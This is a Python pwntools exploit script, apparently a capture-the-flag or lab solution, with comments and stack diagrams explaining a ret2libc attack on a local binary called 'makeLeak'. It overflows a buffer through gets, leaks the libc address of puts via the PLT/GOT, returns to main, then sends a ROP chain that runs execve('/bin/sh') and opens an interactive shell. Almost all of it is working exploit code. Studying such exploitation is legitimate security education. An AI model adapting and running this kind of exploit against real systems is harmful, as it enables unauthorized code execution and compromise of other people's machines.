from pwn import *

# Notes
#   * We need to leak a libc address; without one, all we can do is a return-to-text attack.
#   * We can call `puts` (via the PLT) using the GOT index of `puts` as the argument. This will
#     result in `puts` spitting out the address of `puts` in libc.
#   * Once we have our leaked address, we return back to the start of `main` to execute the
#     vulnerable `gets` again. We use the same rop-chain from leakRop to get our shell.
#   * If you keep very careful track of all the pushes and pops, you can establish that the
#     address for `puts` in the GOT must go 8 bytes below the overwritten return value to
#     function as an argument.
#   * The return value to `main` must go in between the two.
#   * Background on PLT/GOT: https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html
#
# After we call `gets` the first time our stack looks like:
#
#    | AAAA    .      |
#    | AAAA    .      |
#    | AAAA    .      |
#    | AAAA (buffer)  |
#    +----------------+
#    | BBBB (old ebp) |
#    +----------------+
#    |    plt_puts    |
#    +----------------+
#    |      main      |
#    +----------------+
#    |    got_puts    |
#    ------------------
#
# After we call `gets` the second time our stack looks like:
#
#    | AAAA    .      |
#    | AAAA    .      |
#    | AAAA    .      |
#    | AAAA (buffer)  |
#    +----------------+
#    | BBBB (old ebp) |
#    +----------------+
#    | ret1 (popexx)  |
#    +----------------+
#    |    0 (edx)     |
#    +----------------+
#    |    0 (ecx)     |
#    +----------------+
#    | /bin/sh (ebx)  |
#    +----------------+
#    | ret2 (popeax)  |
#    +----------------+
#    |  0xb (eax)     |
#    +----------------+
#    |    syscall     |
#    ------------------

libc = ELF("/lib/i386-linux-gnu/libc.so.6")
puts = libc.symbols['puts']
binsh = next(libc.search("/bin/sh"))

syscall = 0x0002e725
popeax  = 0x0002470f
popexx  = 0x000fb8e1

plt_puts = 0x8048310
got_puts = 0x0804a010
main     = 0x8048436

r = process('./makeLeak')

ropchain1 = "A" * 32 + "B"*4  + p32(plt_puts) + p32(main) + p32(got_puts)
r.sendline(ropchain1)

x = r.recv()
y = x.index('week.\n')
realputs = u32(x[y + 6:y + 10])
offset = realputs - puts

binsh += offset
syscall += offset
popeax += offset
popexx += offset

ropchain2 = "A" * 32 + "B" * 4 + p32(popexx) + p32(0) + p32(0) + p32(binsh) + p32(popeax) + p32(0xb) + p32(syscall)
r.sendline(ropchain2)

r.interactive()
